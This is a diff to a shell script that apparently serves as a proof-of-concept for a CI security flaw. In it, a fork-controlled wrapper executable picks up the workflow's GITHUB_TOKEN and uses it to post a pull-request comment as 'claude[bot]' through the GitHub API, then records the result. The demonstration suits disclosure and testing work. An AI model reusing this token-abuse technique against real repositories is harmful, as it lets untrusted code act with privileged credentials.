@@ -2,6 +2,7 @@
 set -eu
 
 marker="$RUNNER_TEMP/custom-exec-${GITHUB_RUN_ID}.json"
+response="$RUNNER_TEMP/custom-exec-comment-${GITHUB_RUN_ID}.json"
 github_token_present=false
 tokens_equal=false
 
@@ -12,14 +13,35 @@ if [[ -n "${GITHUB_TOKEN-}" && "${GITHUB_TOKEN-}" == "${GH_TOKEN-}" ]]; then
   tokens_equal=true
 fi
 
+test "$github_token_present" = "true"
+test "$tokens_equal" = "true"
+
+pr_number="$(jq -r '.issue.number' "$GITHUB_EVENT_PATH")"
+proof_body="[custom executable path PoC] fork wrapper used the Action token in run ${GITHUB_RUN_ID}."
+payload="$(jq -nc --arg body "$proof_body" '{body: $body}')"
+
+curl --fail-with-body --silent --show-error \
+  --request POST \
+  --header "Authorization: Bearer $GITHUB_TOKEN" \
+  --header "Accept: application/vnd.github+json" \
+  --header "X-GitHub-Api-Version: 2022-11-28" \
+  "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/$pr_number/comments" \
+  --data "$payload" \
+  > "$response"
+
+comment_author="$(jq -r '.user.login' "$response")"
+test "$comment_author" = "claude[bot]"
+
 jq -nc \
-  --arg source "BASE" \
+  --arg source "FORK" \
+  --arg comment_author "$comment_author" \
   --argjson github_token_present "$github_token_present" \
   --argjson tokens_equal "$tokens_equal" \
   '{
     source: $source,
     github_token_present: $github_token_present,
-    tokens_equal: $tokens_equal
+    tokens_equal: $tokens_equal,
+    comment_author: $comment_author
   }' > "$marker"
 
 exit 1
